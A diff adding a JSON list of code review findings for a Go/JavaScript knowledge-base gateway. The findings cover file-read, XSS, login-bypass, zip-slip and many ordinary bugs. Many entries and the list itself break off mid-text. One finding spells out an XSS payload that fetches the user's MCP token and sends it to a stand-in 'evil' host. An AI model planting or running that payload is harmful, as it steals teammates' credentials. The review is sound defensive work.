@@ -1,0 +1,667 @@
+[
+ {
+  "sev": "critical",
+  "cat": "security",
+  "path": "internal/mcp/mcp.go",
+  "lines": "607-608",
+  "content": "Arbitrary server-side file read: `file_path` is passed straight to `os.Open`, and any MCP-token holder reaches this tool (`auth()` only does `FindUserByMCPToken`, no admin role required). The extension check offers no protection because `file_name` is caller-supplied: `file_path=/…/data/data.json` with `file_name=x.txt` passes `DetectMediaType`. `data.json` contains `api_key`, `pass_hash` and `mcp_token`, and the content can be pulled back via `ima_download_media` — cross-user secret disclosure. Device/FIFO paths also slip through (`Stat().Size()==0`). Confine the path to `s.TmpDir` (resolve s"
+ },
+ {
+  "sev": "high",
+  "cat": "bug",
+  "path": "internal/api/api.go",
+  "lines": "569-570",
+  "content": "`UpdateUser` (internal/store/store.go:295) runs the closure directly on the live element (`fn(&s.d.Users[i])`); when it returns an error the store only skips `saveLocked()` — it never rolls the mutation back. So a request like `{\"password\":\"newpass\",\"role\":\"root\"}` applies the new password hash in memory, then fails on the invalid role, and the change becomes durable on the next unrelated save. Validate all inputs (role, password policy, hashing) before touching `x`."
+ },
+ {
+  "sev": "high",
+  "cat": "security",
+  "path": "internal/api/ima_handlers.go",
+  "lines": "303-306",
+  "content": "Stored XSS: with `inline=1` the media is served as `text/html` when its media type is 20 (`.html` is an allowed upload type, see `DetectMediaType`). Any team member can upload an HTML file and send a colleague `/api/ima/download?media_id=...&inline=1`; the victim's browser renders attacker markup on the app origin with the session cookie attached, so it can call all authenticated APIs (session cookie is HttpOnly, but script still executes same-origin). There is no CSP or `X-Content-Type-Options` header anywhere. Restrict inline rendering to safe types (pdf/image/plain-text) and force `applicat"
+ },
+ {
+  "sev": "high",
+  "cat": "security",
+  "path": "internal/auth/auth.go",
+  "lines": "77-78",
+  "content": "Fail-open password check: the decoded hash length is never validated. For a malformed/truncated record such as `pbkdf2$120000$<salt>$`, `want` is empty, `pbkdf2SHA256(..., len(want))` with keyLen 0 returns an empty slice and `subtle.ConstantTimeCompare(empty, empty)` returns 1 — every password verifies for that user (login bypass at api.go:293). Require a non-zero (ideally `keyLen`) hash before comparing."
+ },
+ {
+  "sev": "high",
+  "cat": "bug",
+  "path": "web/api.js",
+  "lines": "51-53",
+  "content": "`unauthorized` is derived from the business `code`, not only the HTTP status, which breaks two real flows:\n1. `writeImaErr` (internal/api/api.go:59) forwards upstream ima business codes with HTTP 200. If ima returns `code` 401 (invalid client/API key), this code treats it as an expired ImaHub session and calls `onUnauthorized()`, kicking the user to the login page even though their ImaHub session is valid.\n2. `/api/login` returns HTTP 401 + code 401 for a wrong password (internal/api/api.go:294), so this branch is also taken. `onUnauthorized()` shows the login view and the `toast(msg, 'error')"
+ },
+ {
+  "sev": "high",
+  "cat": "bug",
+  "path": "web/view-home.js",
+  "lines": "378-379",
+  "content": "Every home panel builds a `head` (card-head) but never inserts it in the data branch — see the same pattern at lines 607 (`renderHomeTasks`), 752 (`renderHomeRecent`), 803 (`renderHomeAccounts`), 864 (`renderHomeToday`) and 957 (`renderHomeSchedule`), all of which assign `'<div class=\"card-body\">'...`. Result: as soon as data arrives, the panel title silently disappears. Worse, in `renderHomeSchedule` the `head` is the only place that renders `<button id=\"ev-add\">添加日程</button>`, so that button never exists in the DOM and the `bind('ev-add', ...)` listener is dead — users can only create an eve"
+ },
+ {
+  "sev": "high",
+  "cat": "bug",
+  "path": "web/view-notes.js",
+  "lines": "112-112",
+  "content": "Notebook rows are rendered with `data-nb-idx` (line 102), which does not match the `[data-nb]` selector, so only the \"全部笔记\" button gets a click listener. Clicking any notebook in the left pane does nothing, and the `else` branch reading `data-nb-idx` is unreachable dead code. This is exactly the kind of divergence caused by copy-pasting `renderKbList`, which correctly binds `.kb-item`."
+ },
+ {
+  "sev": "high",
+  "cat": "security",
+  "path": "web/view-files.js",
+  "lines": "97-97",
+  "content": "Building the `onerror` handler body by string concatenation gives a stored XSS: `escapeHtml` turns `'` into `&#39;`, but the HTML parser decodes entities in attribute values before the handler is compiled as JS. A knowledge base named `';fetch('/api/me/mcp-token').then(r=>r.text()).then(t=>fetch('https://evil/?'+t))//` therefore produces `onerror=\"this.parentNode.textContent='';fetch(...)//'\"`, i.e. valid JS executing in every teammate's browser (KB names come from the shared ima account pool, so any member can plant it). Render the initial character as text and attach an `error` listener afte"
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/store/store.go",
+  "lines": "300-301",
+  "content": "All `Update*` methods invoke `fn` on the live struct and abort on error without rolling back. Callers rely on this to validate, but some mutate before validating: `handleUpdateEvent` sets `Title`/`StartAt`/`EndAt` then returns an error when `EndAt < StartAt`; `handleAdminUpdateUser` sets `PassHash` then may return `\"角色无效\"`; `handleUpdateTask` sets `Title` then may reject an invalid `status`. In those cases the rejected change stays applied in memory (visible to subsequent reads) while `saveLocked()` is skipped, so memory diverges from disk until restart. Apply `fn` to a copy and only commit it"
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/store/store.go",
+  "lines": "505-506",
+  "content": "`fn` receives `&s.d.TeamAccounts[i]`, an interior pointer into the store's slice, and the lock is released as soon as this method returns. `handleUpdateImaAccount` keeps that pointer in its `updated` variable and dereferences it via `publicAccount(updated)` after `UpdateTeamAccount` returns, so a concurrent `Add/Update/DeleteTeamAccount` (which mutate the same backing array under lock) races with the unlocked read. Return a value copy after `fn` succeeds, or have `fn` return the updated value rather than handing out an interior pointer."
+ },
+ {
+  "sev": "medium",
+  "cat": "performance",
+  "path": "internal/store/store.go",
+  "lines": "206-207",
+  "content": "`saveLocked` marshals the whole dataset and performs synchronous `os.WriteFile`+`os.Rename` while the caller holds the exclusive `s.mu`. Every write path (`AddActivity`, `BumpUpload`, `CreateSession`, `DeleteSession`, all `Add*/Update*`) therefore blocks all readers (`GetSession` on the auth hot path) and writers for the duration of the disk I/O. Consider snapshotting (deep-copying the data) under the lock, releasing it, and writing to disk outside the critical section."
+ },
+ {
+  "sev": "medium",
+  "cat": "security",
+  "path": "internal/store/store.go",
+  "lines": "352-354",
+  "content": "The save error is discarded here. `handleLogout` cannot observe failure, so a failed disk write leaves the session deleted only in memory: after a restart the session is resurrected from `data.json` and the user is still logged in. `AddActivity` and `BumpUpload` have the same swallowed `_ = s.saveLocked()` pattern, silently losing activities/upload counters. Propagate the error (change `DeleteSession` to return it) and let the caller handle/log it."
+ },
+ {
+  "sev": "medium",
+  "cat": "security",
+  "path": "main.go",
+  "lines": "67-67",
+  "content": "`http.Server` has no `ReadHeaderTimeout`/`IdleTimeout`. This gateway is reachable over the network, so a client can open connections and never finish sending headers, pinning a goroutine + fd per connection (Slowloris) until the process is starved; idle keep-alive connections are never reaped either. Note that `WriteTimeout` should stay unset (or be very large) because `handleDownloadZip` streams the zip directly to the response over a potentially long request. Add `\"time\"` to the imports."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "main.go",
+  "lines": "83-83",
+  "content": "`Close()` kills listeners and all active connections immediately instead of draining them. In-flight requests are cut mid-stream — e.g. `handleDownloadZip` writes the zip straight into the `http.ResponseWriter` (internal/api/download.go:101-129), and archive uploads write temp files — so clients receive a truncated/corrupt zip with no error. Use `Shutdown` with a bounded context and fall back to `Close` only on timeout."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/api.go",
+  "lines": "462-464",
+  "content": "`a` is a pointer into `s.d.TeamAccounts` handed to the closure by `UpdateTeamAccount`; the reference is retained past the call, so `publicAccount(updated)` reads store-internal fields after the lock has been released. That races with a concurrent PATCH/DELETE of the same account (and may return a record already shifted/overwritten by `DeleteTeamAccount`). Snapshot the value inside the closure instead: `cp := *a; updated = &cp`."
+ },
+ {
+  "sev": "medium",
+  "cat": "security",
+  "path": "internal/api/api.go",
+  "lines": "212-215",
+  "content": "Check-then-act on an unauthenticated endpoint: `UserCount()` and the subsequent `createUser` take the store lock separately, and `AddUser` only rejects duplicate usernames, not a second admin. Two parallel `POST /api/setup` calls (or an attacker racing the owner at first boot) can both pass this check and create two admin accounts. Guard the whole bootstrap with a `Server`-level mutex, or add an atomic `Store.CreateFirstAdmin` that performs the count check and insert under one lock."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/api.go",
+  "lines": "259-263",
+  "content": "The failure is swallowed: `handleLogin`/`handleRegister`/`handleSetup` still return `200 OK` with the user object even though no cookie was set, so the browser believes it is authenticated and immediately gets 401 on `/api/me`. Return the error here and have callers respond with 500 (for `/api/setup` the admin would otherwise be created without a usable session)."
+ },
+ {
+  "sev": "medium",
+  "cat": "security",
+  "path": "internal/api/api.go",
+  "lines": "269-270",
+  "content": "The `sid` cookie has no `Secure` flag, so the 30-day session token is sent in clear text whenever the gateway is reached over plain HTTP or a proxy that also serves HTTP. Add `Secure: true`, ideally gated by a setting/request-is-TLS check so plain-HTTP LAN deployments keep working."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/app.js",
+  "lines": "199-201",
+  "content": "注册成功后 `renderAuthForm()` 已把 `state.authMode` 切到 `login` 并把按钮文案改成「登 录」，随后这里无条件用注册前捕获的 `oldText`（「注 册」）覆盖回去，导致表单已是登录态而按钮仍显示「注册」。而第 201 行的 setup 分支 assignment 与 `oldText` 值完全相同，属于冗余代码，应一并去掉。"
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/app.js",
+  "lines": "181-182",
+  "content": "初始化管理员成功后没有把 `state.needSetup` 置为 false。`onUnauthorized()` 会用 `state.needSetup` 决定回落到哪个表单，因此管理员创建完成、会话过期时会再次弹出「初始化管理员」表单（提交必然失败），用户无法正常重新登录。"
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/api.js",
+  "lines": "103-104",
+  "content": "XHR 上传路径在 401 时只构造了 `unauthorized` 标记并 reject，没有像 `api()` 第 53 行那样调用 `onUnauthorized()`。上传过程中会话过期时，用户只会看到一行「失败：登录已过期」的进度状态，页面停留在过期状态，后续请求才可能触发跳转，体验不一致。建议与该分支保持一致。"
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/api.js",
+  "lines": "111-111",
+  "content": "注册了 `xhr.ontimeout`，但整个文件（以及其余 web 脚本）都没有给这个 XHR 设置 `xhr.timeout`，因此该处理器永远不会触发，属于死代码；实际效果是上传在服务端/网络卡死时会无限期挂起，进度条与提交按钮永久停留在「上传中」。建议显式设置超时（如 5 分钟）后再 `send`。"
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/ui.js",
+  "lines": "129-132",
+  "content": "Escape 监听器只在自身被触发后才 `removeEventListener`：通过关闭按钮、点击遮罩或 `confirmDialog` 的「确认/取消」关闭时（这些路径在 confirmDialog 中非常常见）监听器会残留，直到下一次按键才被清理，形成累积泄漏。此外每个打开的模态都注册一个全局 Escape 处理器，且判断条件是「自己未关闭」，所以叠加模态（例如从模态内再弹确认框）时一次 Esc 会把所有层一起关掉。建议在 `close()` 内统一移除监听器，并只让最顶层模态响应 Escape。"
+ },
+ {
+  "sev": "medium",
+  "cat": "maintainability",
+  "path": "web/style.css",
+  "lines": "735-735",
+  "content": "`.home-page` 被重复定义：第 585 行是 `display:grid; grid-template-columns:1.15fr 1fr; padding:20px 22px 40px`，此处又改成 `display:block; padding:0 0 28px`。later-wins 使得第 585 行的网格声明以及第 695 行 `@media (max-width:860px)` 中的 `grid-template-columns:1fr; padding:14px 12px 32px` 全部变成死代码（移动端 padding 也被这里的 0 覆盖）。同理 `.task-dot`、`.hero-decor::after`、`.hero-chip` 均被二次声明覆盖。建议把最终值合并回首次定义处，删除追加的重复规则，避免级联顺序依赖。"
+ },
+ {
+  "sev": "medium",
+  "cat": "security",
+  "path": "internal/ima/archive.go",
+  "lines": "141-142",
+  "content": "`writeEntry` caps each entry with a fixed full `MaxArchiveTotal` budget, and the real cumulative check in `extractCounter.add` runs only after the entry is fully written. Consequences: (1) a decompression bomb can push peak disk usage to ~2x `MaxArchiveTotal` before the check trips, silently exceeding the documented 2 GB cap; (2) an entry whose decompressed size exceeds the limit is truncated by `io.LimitReader` and still recorded as a successful `ExtractedFile` (`n` == limit, no error), so truncated data is reported as a complete file. Pass the remaining budget (`MaxArchiveTotal - c.bytes`) i"
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/ima/cos.go",
+  "lines": "63-63",
+  "content": "The signed PUT is issued with `http.DefaultClient`, which has no timeout, while every other ima call uses `Client.HTTP` (5-minute timeout). Cancellation therefore depends entirely on the caller's context; both the API handlers and MCP use `r.Context()`, which is only canceled when the client disconnects, so a stalled COS endpoint can pin the request goroutine/connection indefinitely. Route this through the configured `Client.HTTP` (e.g., make `cosUpload` a method on `Client` or accept an `*http.Client`)."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/dashboard.go",
+  "lines": "243-248",
+  "content": "Validation happens *after* the fields are already written into the live store entry. `Store.UpdateTask` passes `&s.d.Tasks[i]` straight into this closure and only calls `saveLocked()` when the closure returns nil, so a rejected request (e.g. `{title:\"A\", status:\"bogus\"}`) still leaves `Title` mutated in memory; the next unrelated `saveLocked()` (another upload/task/event write) then persists that unintended change, while the caller received a 400. Validate the whole request first, then apply."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/events.go",
+  "lines": "112-115",
+  "content": "Same partial-mutation problem as the task handlers: `Store.UpdateEvent` hands the live `&s.d.Events[i]` to this closure, so all `e.*` assignments above are already applied in memory when this cross-field check fails. A request like `{title:\"x\", end_at:1}` on an event starting later returns 400 to the caller but permanently corrupts the in-memory title (persisted by the next unrelated save). Compute/validate the new start/end pair before mutating `e`."
+ },
+ {
+  "sev": "medium",
+  "cat": "security",
+  "path": "internal/api/ima_handlers.go",
+  "lines": "370-370",
+  "content": "No request-body cap is applied before parsing; `maxMemory` only controls how much stays in RAM, and everything beyond it is spilled to disk unbounded. Since `handleImaUpload` size checks happen after the whole body has been written to a multipart temp file, a client can fill the host disk with an arbitrarily large upload. Wrap the body with `http.MaxBytesReader` (a bit above the largest allowed file, e.g. the 500MB archive cap) before `ParseMultipartForm`."
+ },
+ {
+  "sev": "medium",
+  "cat": "security",
+  "path": "internal/api/download.go",
+  "lines": "114-117",
+  "content": "The title is used verbatim as the zip entry name (`zw.Create(name)`). Titles come from shared ima data (e.g. note titles derived from note content, or client-supplied `items[].title`), so a title containing `/`, `\\` or `..` produces traversal/directory entries that can escape the extraction directory on the victim's machine (zip-slip) or create unintended directories. Sanitize each entry to a single flat filename, consistent with the policy already implemented in `ima.safeRel`/`relTitle`."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/download.go",
+  "lines": "109-113",
+  "content": "Data is dropped silently in two places: this `break` stops packaging the remaining targets after 500MB with no marker, and `writeZipEntry` uses `io.LimitReader(body, maxPerFile)` which truncates any file >200MB without an error. The user receives a structurally valid but incomplete archive with no way to tell files are missing or truncated. Emit an explicit `[未下载]`/`[已截断]` marker entry (or fail the request) so the incompleteness is visible."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/download.go",
+  "lines": "161-163",
+  "content": "The `io.Copy` error is discarded and the function returns `nil`, so a failure while streaming the media (network reset, short read from ima) silently produces a truncated entry that looks successful. Capture the error and return it (letting the caller emit the `[失败]` marker); with `LimitReader` also report truncation when the source exceeds `maxPerFile`."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/store/store.go",
+  "lines": "500-500",
+  "content": "`AddTeamAccount` enforces unique account names, but `UpdateTeamAccount` does not, so a rename can produce duplicate names. Name is a lookup key downstream: `resolveImaAccount` in internal/api/api.go matches `a.ID == accountID || a.Name == accountID` and returns the first hit, so once two accounts share a name, uploads/downloads addressed by name silently go to the wrong ima account. Enforce the same uniqueness rule here (skipping the account being updated)."
+ },
+ {
+  "sev": "medium",
+  "cat": "security",
+  "path": "internal/store/store.go",
+  "lines": "330-330",
+  "content": "There is no user-scoped session revocation: only `DeleteUser` purges a user's sessions, and `CreateSession` always issues a fresh 30-day token. Consequently a password change (`handleChangePassword`) or an admin reset of a compromised account (`handleAdminUpdateUser`) leaves every previously issued cookie valid for up to 30 days, so the remediation does not lock the attacker out. Add something like `DeleteSessionsByUser(userID)` (DeleteUser already inlines this loop) and call it whenever the password changes."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/mcp/mcp.go",
+  "lines": "564-564",
+  "content": "`rest` already replays the sniffed bytes (`io.MultiReader(strings.NewReader(string(sniff[:n])), body)`), so `io.Copy(io.Discard, rest)` returns the full size and `total+int64(n)` double counts (reports size+512). Additionally, draining the whole body just to print an approximate size wastes bandwidth on large binaries — `hdr.Get(\"Content-Length\")` is available."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/mcp/mcp.go",
+  "lines": "568-568",
+  "content": "The read error from `io.ReadAll` is discarded. If the body fails mid-transfer, partial content is returned with `truncated=false` (the extra-byte probe also errors out), so callers treat an incomplete download as complete text. Propagate the error instead."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/api.go",
+  "lines": "523-524",
+  "content": "`FindUserByID` returns `(nil, false)` when the record disappears, and the boolean is discarded. If an admin deletes this user between `UpdateUser` returning and this lookup (a real interleaving in a multi-user service), `nu.MCPToken` panics inside the request handler. Check `ok` and return a regular error instead."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/api.go",
+  "lines": "62-62",
+  "content": "The IMA platform's business code is forwarded verbatim into ImaHub's envelope `code`. `web/api.js:51` treats `code === 401` as \"session expired\" and calls `onUnauthorized()`, so an IMA-side credential/auth error carrying code 401 on a shared account will silently log the caller out instead of surfacing the real error. Map IMA errors to a fixed ImaHub code and keep the IMA code in `msg`."
+ },
+ {
+  "sev": "medium",
+  "cat": "security",
+  "path": "internal/api/api.go",
+  "lines": "394-397",
+  "content": "Changing the password leaves every other `sid` session alive (30-day cookies), so a stolen session keeps full access after the victim rotates the password; an admin password reset (`handleAdminUpdateUser`) has the same gap. After a successful password change, revoke the user's other sessions (add a store helper analogous to the session cleanup in `DeleteUser`)."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/style.css",
+  "lines": "806-806",
+  "content": "`--card` is never declared anywhere (only `--panel`, `--panel-2`, etc. exist in `:root` and `[data-theme=\"dark\"]`), so this always resolves to the `#fff` fallback. In dark mode the donut hole becomes a bright white circle, and the same variable in `.timeline .recent-icon` (line 825) produces a white ring around each timeline icon. Use `var(--panel)` instead."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/style.css",
+  "lines": "125-125",
+  "content": "`body` has `overflow: hidden` (line 63), but this container only sets `min-height: 100vh` with an auto height, so it grows with its content and `overflow: auto` never produces a scrollbar. On narrow viewports the `@media (max-width: 860px)` rule stacks `.login-hero` and `.login-side`, making the login page taller than the viewport; the lower part (submit button, register link) is then clipped and unreachable because the body cannot scroll. Constrain the height so the container itself scrolls (or allow body scrolling while the login view is shown)."
+ },
+ {
+  "sev": "medium",
+  "cat": "performance",
+  "path": "internal/api/download.go",
+  "lines": "47-52",
+  "content": "The caller-supplied `items` branch has no cap: `maxFiles` (200) is only applied when traversing a KB folder, while `req.Items` can contain arbitrarily many media IDs. Each item costs two sequential upstream calls (get_media_info + fetch), and the `total > maxTotal` break only triggers after 500MB of *successful* transfers, so an authenticated script can keep this handler busy for a very long time (especially with failing/small entries). Reject or truncate when `len(req.Items) > maxFiles`, and consider capping the JSON body size in `decodeBody`."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/ima_handlers.go",
+  "lines": "393-396",
+  "content": "Auto mode round-robins over the whole team pool, but accounts created through `handleBindIma` start with an empty `UploadKBID` (it is only set later via PATCH). When `nextRR` lands on such an account the upload fails with “未配置默认上传知识库”, even though other pool accounts are usable — i.e. auto upload fails intermittently depending on pool composition. When `kbID` is empty, build the candidate list from accounts with `UploadKBID != \"\"` before indexing it."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/ima_handlers.go",
+  "lines": "311-311",
+  "content": "The copy error is discarded. The response headers have already been sent and no `Content-Length` is set, so if the upstream connection resets mid-stream the handler returns normally, the server terminates the chunked body cleanly, and the client stores a silently truncated file as a successful download. Check the error and abort the connection (e.g. `panic(http.ErrAbortHandler)`) or at least log it; forwarding the upstream `Content-Length` would also let clients detect truncation."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/ima_handlers.go",
+  "lines": "561-561",
+  "content": "Aggregate mode ignores the `cursor` query parameter and hard-codes `is_end: true`. `web/view-notes.js` always calls `/api/ima/notebooks` without `ia` (i.e. this aggregate path) and drives its load-more button off `next_cursor`/`is_end`, so only the first `limit` notebooks of each account are ever reachable and the UI never offers more. Aggregate pagination needs per-account cursors, or the response must not claim `is_end` while accounts still have pages. The same issue exists in the aggregate branches of `handleImaKBs`/`handleImaAddableKBs`, where `loadKbs()` in view-files.js also passes a cur"
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/api/ima_handlers.go",
+  "lines": "423-426",
+  "content": "Returning here bypasses the duplicate-name gate below: re-uploading the same archive silently creates duplicate KB entries, whereas the single-file flow responds 409 and waits for the user to confirm (`force`). `UploadFile`'s `repeated` result is only collected into the response, and `view-files.js` only counts `uploaded`/`failed`, so the user never sees it. Either check the extracted names before uploading and surface duplicates for confirmation (passing `force` through), or require `force` for archive uploads."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/ask/ask.go",
+  "lines": "94-97",
+  "content": "Every per-account and per-KB failure is silently dropped here (`continue`), and the KB-level `SearchKnowledge` errors are dropped the same way below. If all backends fail (revoked/expired API key, wrong base URL, network error), `Run` still returns `nil` error with empty/partial `Sources`, so the API/UI reports「知识库中没有找到」instead of surfacing the outage, and the LLM happily answers \"not found\" from an empty context. Track failures and return an error when no account produced any result (while still returning partial sources when at least one succeeded)."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/ask/ask.go",
+  "lines": "117-119",
+  "content": "`TopK` is documented as 引用条数（默认 6）, but this cap collects `TopK*2` candidates and nothing ever trims them back: `retrieve` returns up to 12 sources and `synthesize` puts all of them (up to `MaxCtx` each) into the prompt. Since `top_k` is passed straight through from `/api/ask` and the MCP `ima_ask` tool with no upper bound, a caller can request a huge value, making the model prompt (and cost/latency) effectively unbounded. Clamp `TopK` in `Run` (e.g. ≤20) and either collect exactly `opt.TopK` items or trim `out` to `opt.TopK` before returning."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/mcp/mcp.go",
+  "lines": "556-556",
+  "content": "Binary detection only treats NUL bytes as binary. Many binary formats (e.g. PDF, whose first 512 bytes are usually ASCII/compressed payload without a `0x00`) pass this check, so the tool returns `kind: \"text\"` and ships the raw bytes as the `content` string (invalid UTF-8 gets replaced with U+FFFD by `encoding/json`) instead of returning the download `url` that the tool description promises. Use `http.DetectContentType` or `info.MediaType` (or at least also reject invalid UTF-8/control bytes) rather than a NUL-only scan."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/ima/client.go",
+  "lines": "596-599",
+  "content": "`ListNote` 是 cursor 分页接口（请求带 `cursor`/`limit`），但响应结构没有解析 `next_cursor`（`ListNotebookRsp`/`KnowledgeListRsp`/`SearchKBRsp` 都解析了），`handleImaNotes` 也就无法向前端返回下一页游标。`web/view-notes.js` 的 `loadNotes` 会读取 `page.nextCursor`；当 `is_end=false` 时点击「加载更多」会以空 cursor 重新请求第一页，导致笔记列表重复、无法翻页。建议补上 `NextCursor` 字段，并在 handler 中透传。"
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "internal/ima/client.go",
+  "lines": "558-559",
+  "content": "同一文件里 `NoteInfo` 的 `create_time`/`modify_time` 用 `FlexInt` 解析（`FlexInt` 存在的原因正是 ima 会把部分数字序列化成字符串，且本结构内 `note_number`/`folder_type` 也用 FlexInt），这里却用 `int64`。一旦 `list_notebook` 返回的这两个字段是字符串，`json.Unmarshal` 会直接失败，导致整个 `ListNotebook` 调用报错。建议统一改为 `FlexInt`。"
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/view-files.js",
+  "lines": "66-66",
+  "content": "Returning here skips `filesState.kbLoading = false` below. Because `loadKbs` starts with `if (filesState.kbLoading) return;`, a 401 during the KB list request leaves the flag permanently true: after re-login (`onUnauthorized` only shows the login view, it does not reload the page) `renderFilesView` skips the initial load and `#kb-refresh` / `#kb-more` / the `#kb-q` search all become no-ops, leaving the panel stuck on skeletons until a full page reload. Move the reset into a `finally` block."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/view-files.js",
+  "lines": "138-138",
+  "content": "`enterFolder()` / `selectKb()` mutate `filesState.folder` and `filesState.path` and then call `loadList(true)`, but while a request is in flight this guard drops the call. The in-flight response then fills `filesState.items` with the *old* folder's files while `renderCrumbs()` shows the new folder, and the next `#files-more` click fetches the new folder — leaving list and breadcrumb inconsistent and the folder click apparently ignored. Abort/queue the pending request (or keep a request token) instead of silently discarding navigation."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/view-files.js",
+  "lines": "122-123",
+  "content": "`filesState.selected` is not cleared when switching knowledge base, so the batch bar keeps counting the previous KB's `media_id`s. `downloadZip(Object.values(filesState.selected))` then posts those ids together with the new `ia`/`kb`, which either fails or downloads unrelated items. Reset `filesState.selected = {}` here (and consider validating that selected ids belong to the current KB/account)."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/view-notes.js",
+  "lines": "149-150",
+  "content": "`/api/ima/notes` returns only `note_book_list` and `is_end` (see `handleImaNotes`; `ima.ListNoteRsp` has no `next_cursor`), so `pickPage(data).nextCursor` is always `null`. As soon as the backend reports `is_end: false` (e.g. more than 20 notes in a notebook), \"加载更多\" sends no cursor, re-fetches page 1 and appends duplicates indefinitely (`s.cursor`/`notesState.cursor` stay `null` in the aggregate branch too). Either derive the cursor server-side or hide the load-more button for notes."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/view-files.js",
+  "lines": "52-52",
+  "content": "This in-flight guard also swallows user searches. `#kb-q`'s debounced handler calls `loadKbs(true)` (bindFilesEvents), so if the initial load or a previous search is still running, the typed query is dropped. When the in-flight request finishes, the list reflects the *older* query while the input shows the new one, and nothing re-runs (the debounce only fires on the next keystroke). Either queue the latest query (set a pending flag and re-run `loadKbs(true)` at the end of the function) or compare `filesState.kbQuery` with the query used for the response and retry when they differ."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/view-files.js",
+  "lines": "487-487",
+  "content": "`folderOptions` only contains the *children* of the current folder, so `curFolder` (declared a few lines below as `filesState.folder`) can never match one of the option values and the `if (has) folderSel.value = curFolder` preselection is dead code. As a result, uploading or dropping files while browsing a subfolder sends `folder_id=''` and the files land in the knowledge-base root, contradicting the drop overlay hint (“释放鼠标，上传到当前目录”) and the import modal, which correctly uses `filesState.folder`. Move the `curFolder` computation above this line and expose an explicit current-folder option (e."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/view-notes.js",
+  "lines": "244-244",
+  "content": "The response is applied to whatever `notesState.currentNote` happens to be when the request resolves. Clicking note A and then quickly note B can render A's content under B's title, and if the user closes the viewer (`#note-close-btn` sets `currentNote = null`) before the response arrives, this line throws `TypeError: Cannot set properties of null` (same for the `catch` block below). Capture the requested id and verify it before applying, and also skip when the viewer was closed."
+ },
+ {
+  "sev": "medium",
+  "cat": "bug",
+  "path": "web/view-misc.js",
+  "lines": "86-86",
+  "content": "A failed load is silently swallowed and `cfg` stays `{}`, so the form renders empty (base URL / model look unset). If the admin then hits “保存问答模型配置”, `ask_base_url` and `ask_model` are sent as `''` and `handleAdminPutSettings` stores the empty strings — silently disabling the ask feature. On load failure render an error/retry state (like `loadAdminSettings` does) and don't allow saving the blank form."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "main.go",
+  "lines": "52-52",
+  "content": "The `MkdirAll` error is discarded, and the dir is created only after `TmpDir` has already been handed to both the api and mcp servers. If the data dir is read-only/uncreatable, startup still logs \"已启动\" and the failure only surfaces later as an opaque `os.CreateTemp` error on upload (internal/api/archive_upload.go:32, internal/mcp/mcp.go:629). Fail fast on startup instead."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "main.go",
+  "lines": "91-91",
+  "content": "`fs.FS` paths are always slash-separated regardless of OS, but `filepath.Clean` converts separators using the host OS rules (on a Windows build `a/b` becomes `a\\b`, which `fs.Stat` treats as a single literal file name). Today the embedded assets are flat so the bug is masked, but adding any subdirectory under `web/` would make every nested asset fail `Stat`, fall back to `index.html`, and break the UI on Windows builds (which build.sh targets explicitly). Use `path.Clean`."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "main.go",
+  "lines": "56-56",
+  "content": "`/mcp` without a trailing slash is an exact-match pattern in `http.ServeMux`. A request to `/mcp/` therefore falls through to the `\"/\"` SPA handler and returns `index.html` with HTTP 200, so an MCP client configured with a trailing slash sees HTML instead of a JSON-RPC error. `mcp.Server.ServeHTTP` is path-agnostic, so it is safe to also mount the subtree."
+ },
+ {
+  "sev": "low",
+  "cat": "maintainability",
+  "path": "scripts/build.sh",
+  "lines": "8-8",
